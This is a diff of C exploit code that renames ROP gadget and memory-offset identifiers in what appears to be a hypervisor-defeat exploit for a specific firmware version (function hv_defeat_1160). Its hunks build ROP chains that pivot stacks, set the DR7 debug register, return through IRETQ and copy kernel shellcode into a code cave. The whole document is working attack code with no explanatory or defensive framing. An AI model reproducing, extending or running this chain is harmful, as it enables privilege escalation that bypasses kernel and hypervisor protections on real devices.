@@ -99,7 +99,7 @@ static int offsets_present(void) {
       env_offset.FUN_MEMCPY,
       env_offset.HV_MP_STARTUP_CALL,
       env_offset.MP_STARTUP_INIT_VECTOR,
-      env_offset.RESUME_DATA_CAVE,
+      env_offset.DATA_CAVE,
       env_offset.GAD_ADD_RSP_28_POP_RBP_RET,
       env_offset.GAD_PIVOT_ADD_RSP28_RET,
       env_offset.GAD_IRETQ,
@@ -109,12 +109,12 @@ static int offsets_present(void) {
       env_offset.GAD_POP_RSI_RET,
       env_offset.GAD_POP_RDX_RET,
       env_offset.GAD_POP_RSP_RET,
-      env_offset.GAD_STORE_RDI8_RCX,
-      env_offset.GAD_SET_DR7,
-      env_offset.GAD_ST_RCX_RAX,
-      env_offset.GAD_MOV_RAX_RDI,
-      env_offset.GAD_REP_MOVSB,
-      env_offset.GAD_CLD,
+      env_offset.GAD_STORE_RDI8_RCX_RET,
+      env_offset.GAD_SET_DR7_RET,
+      env_offset.GAD_STORE_RCX_RAX_RET,
+      env_offset.GAD_MOV_RAX_RDI_RET,
+      env_offset.GAD_REP_MOVSB_RET,
+      env_offset.GAD_CLD_RET,
       env_offset.GAD_RET_TRAMP,
       env_offset.GAD_DBREG_RESUME,
       env_offset.G_VBIOS,
@@ -126,7 +126,7 @@ static int offsets_present(void) {
   if (kernel_get_fw_version() != FW_1160_RAW || fw != 0x1160)
     return 0;
   if (env_offset.KERNEL_CODE_CAVE != 0xD2B000ULL ||
-      env_offset.RESUME_DATA_CAVE != 0x2D02000ULL)
+      env_offset.DATA_CAVE != 0x2D02000ULL)
     return 0;
   for (size_t i = 0; i < sizeof(required) / sizeof(required[0]); i++)
     if (required[i] == 0)
@@ -247,7 +247,7 @@ static int chain_store(uint8_t *buf, size_t *off, size_t cap,
          chain_q(buf, off, cap, target - 8) ||
          chain_q(buf, off, cap, kg(env_offset.GAD_POP_RCX_RET)) ||
          chain_q(buf, off, cap, value) ||
-         chain_q(buf, off, cap, kg(env_offset.GAD_STORE_RDI8_RCX));
+         chain_q(buf, off, cap, kg(env_offset.GAD_STORE_RDI8_RCX_RET));
 }
 
 static int build_passthrough(uint8_t *stack, uint64_t stack_va) {
@@ -287,7 +287,7 @@ static int build_arm(uint8_t *arm, uint64_t arm_va, uint64_t hook_target,
       chain_q(arm, &off, 0x400, selected_ist - 8) ||
       chain_q(arm, &off, 0x400, kg(env_offset.GAD_POP_RCX_RET)) ||
       chain_q(arm, &off, 0x400, handler_top) ||
-      chain_q(arm, &off, 0x400, kg(env_offset.GAD_STORE_RDI8_RCX)) ||
+      chain_q(arm, &off, 0x400, kg(env_offset.GAD_STORE_RDI8_RCX_RET)) ||
       chain_q(arm, &off, 0x400, kg(env_offset.GAD_IRETQ)))
     return -1;
   off += 5 * sizeof(uint64_t);
@@ -306,27 +306,27 @@ static int build_handler(uint8_t *handler, uint64_t handler_va,
   memset(handler, 0, 0x400);
   memcpy(handler + IRET_OFF, &(uint64_t){kg(env_offset.GAD_IRETQ)}, 8);
 
-  if (chain_q(handler, &off, 0x400, kg(env_offset.GAD_MOV_RAX_RDI)) ||
+  if (chain_q(handler, &off, 0x400, kg(env_offset.GAD_MOV_RAX_RDI_RET)) ||
       chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RCX_RET)))
     return -1;
   save_addr_off = off;
   if (chain_q(handler, &off, 0x400, 0) ||
-      chain_q(handler, &off, 0x400, kg(env_offset.GAD_ST_RCX_RAX)) ||
+      chain_q(handler, &off, 0x400, kg(env_offset.GAD_STORE_RCX_RAX_RET)) ||
       chain_store(handler, &off, 0x400, db_gate, saved_gate_lo) ||
       chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RAX_RET)) ||
       chain_q(handler, &off, 0x400, 0) ||
-      chain_q(handler, &off, 0x400, kg(env_offset.GAD_SET_DR7)) ||
+      chain_q(handler, &off, 0x400, kg(env_offset.GAD_SET_DR7_RET)) ||
       chain_store(handler, &off, 0x400, oracle + 0x20, CHAIN_MARK))
     return -1;
 
-  if (chain_q(handler, &off, 0x400, kg(env_offset.GAD_CLD)) ||
+  if (chain_q(handler, &off, 0x400, kg(env_offset.GAD_CLD_RET)) ||
       chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RDI_RET)) ||
       chain_q(handler, &off, 0x400, payload_va) ||
       chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RSI_RET)) ||
       chain_q(handler, &off, 0x400, resume_cave + CAVE_AP_SOURCE_OFF) ||
       chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RCX_RET)) ||
       chain_q(handler, &off, 0x400, AP_COPY_SIZE) ||
-      chain_q(handler, &off, 0x400, kg(env_offset.GAD_REP_MOVSB)))
+      chain_q(handler, &off, 0x400, kg(env_offset.GAD_REP_MOVSB_RET)))
     return -1;
 
 #define STORE_PARAM(offset, value)                                             \
@@ -582,7 +582,7 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
   if (sx_ist == dmap || build_sx_rop(sx_ist, shellcode_kernel_len))
     return -1;
 
-  resume_cave = kg(env_offset.RESUME_DATA_CAVE);
+  resume_cave = kg(env_offset.DATA_CAVE);
   if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0) {
     notify("11.60 resume carrier has stale state; cold reboot required\n");
     return -1;
